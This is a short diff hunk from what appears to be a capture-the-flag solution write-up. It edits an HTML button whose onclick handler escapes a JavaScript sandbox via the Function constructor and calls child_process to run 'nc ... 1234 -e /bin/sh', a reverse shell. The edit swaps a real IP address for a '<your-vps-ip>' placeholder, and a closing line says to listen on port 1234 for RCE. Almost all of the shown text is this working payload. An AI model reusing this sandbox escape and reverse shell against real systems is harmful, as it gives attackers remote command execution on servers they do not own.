@@ -125,7 +125,7 @@ My solution
 <html>
 	<a href="http://www.google.com" name="A" class="nextasdhasd">haahahah</a>
 	<a href="http://www.google.com" name="B" class="nexthehe">haadsasdahahah</a>
-	<button href="http://www.google.com" name="A" class="next" onclick="function fn(){};var constructorProperty = Object.getOwnPropertyDescriptors(fn.__proto__).constructor;var properties = Object.values(constructorProperty);properties.pop();properties.pop();properties.pop();var Func = properties.map(function (x) {return x.bind(x, 'return this.process.mainModule.constructor._load(`child_process`).execSync(`nc 45.77.45.157 1234 -e /bin/sh`)')}).pop();(Func())()">hehe</button>
+	<button href="http://www.google.com" name="A" class="next" onclick="function fn(){};var constructorProperty = Object.getOwnPropertyDescriptors(fn.__proto__).constructor;var properties = Object.values(constructorProperty);properties.pop();properties.pop();properties.pop();var Func = properties.map(function (x) {return x.bind(x, 'return this.process.mainModule.constructor._load(`child_process`).execSync(`nc <your-vps-ip> 1234 -e /bin/sh`)')}).pop();(Func())()">hehe</button>
 </html>
 ```
  Setup listen on port 1234 and RCE  
